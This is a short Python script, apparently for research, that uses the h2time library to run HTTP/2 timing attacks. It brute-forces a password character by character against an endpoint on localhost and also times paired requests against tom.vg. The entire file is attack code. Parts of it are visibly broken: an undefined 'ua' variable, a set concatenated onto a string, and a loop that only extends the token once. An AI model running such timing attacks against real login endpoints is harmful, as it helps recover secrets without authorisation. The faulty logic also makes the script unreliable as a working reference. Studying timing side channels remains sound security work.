from h2time import H2Time, H2Request
import asyncio
import string
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('research')
logging.getLogger('H2Protocol').setLevel(logging.WARNING)  # Disable H2Protocol logger

async def create_auth_request(token: str) -> H2Request:
    """Create an H2Request with the specified Authorization token."""
    return H2Request(
        method="GET",
        url=f"https://localhost:8888/?password={token}$",
        headers={
            "User-Agent": "h2time/0.1"
        }
    )
    
async def run_two_gets():
    r1 = H2Request('GET', 'https://tom.vg/?1', {'user-agent': ua})
    r2 = H2Request('GET', 'https://tom.vg/?2', {'user-agent': ua})
    logger.info('Starting h2time with 2 GET requests')
    async with H2Time(r1, r2, num_request_pairs=5) as h2t:
        results = await h2t.run_attack()
        print('\n'.join(map(lambda x: ','.join(map(str, x)), results)))
    logger.info('h2time with 2 GET requests finished')

async def perform_timing_attack(token_prefix: str, char_set: str = string.digits + string.ascii_uppercase) -> str:
    """Perform a timing attack to find the next character in the token."""
    potential_chars = set()
    best_score = float('-inf')
    
    for idx in range(len(char_set)):
        char1 = char_set[idx]
        char2 = char_set[(idx + 1) % len(char_set)]
        r1 = await create_auth_request(token_prefix + char1)
        r2 = await create_auth_request(token_prefix + char2)
        
        async with H2Time(r1, r2, num_request_pairs=10, send_order_pattern="2", sequential=False, verify_cert=False) as h2t:
            results = await h2t.run_attack()
            if results:
                first_request_quicker = len([r for r in results if r[0] < 0])
                second_request_quicker = len([r for r in results if r[0] > 0])
                diff = abs(first_request_quicker - second_request_quicker)
                logger.info(f"{char1} {char2} diff: {diff}, t1 avg: {sum(int(r[0]) for r in results) / len(results)}")
                
                if diff:
                    potential_chars.add(char1)
                    
    logger.info(f"Potential chars: {potential_chars}")               
    
    return potential_chars

async def find_token() -> str:
    """Find the complete token using timing attacks."""
    token = ""
    potential_chars = []
    while True:
        next_char_set = await perform_timing_attack(token)
        if not next_char_set:
            break
        potential_chars.append(next_char_set)
        if len(potential_chars) == 1:
            token += potential_chars[0]
        print(f"Found token so far: {token}")
    
    if token:
        print(f"Found token: {token}")
    else:
        print("No token found - endpoint not vulnerable")

    return token

if __name__ == "__main__":
    try:
        asyncio.run(find_token())
    except KeyboardInterrupt:
        logger.info("Interrupted by user")


